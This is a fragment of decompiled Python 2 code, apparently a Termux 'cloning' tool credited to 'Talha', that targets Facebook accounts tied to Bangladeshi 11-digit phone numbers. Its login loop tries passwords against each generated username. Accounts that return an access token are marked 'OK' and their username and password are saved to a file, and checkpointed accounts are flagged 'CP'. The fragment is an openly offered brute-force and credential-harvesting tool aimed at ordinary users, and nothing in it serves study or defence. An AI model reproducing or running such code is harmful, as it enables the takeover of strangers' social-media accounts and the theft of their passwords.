...
# Time Succes decompile : 2022-09-10 12:17:21.801207
...
os.system('clear')
psb('\x1b[1;32mBANGLADESH 11 DIGIT TALHA CLONING START PLEASE WAIT ..........')
for n in range(9999):
...
def menu():
    ...
    print 'YOUTUBE  : Talha Technology Channel'
    print 'GITHUB   : TermuxTalha'
    print ''
    print 50 * '-'
    print '[1]  \x1b[1;96mGP'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Talha-OK]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[Talha-CP]\x1b[1;97m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m [Login After 07 Days]\x1b[0m \n'
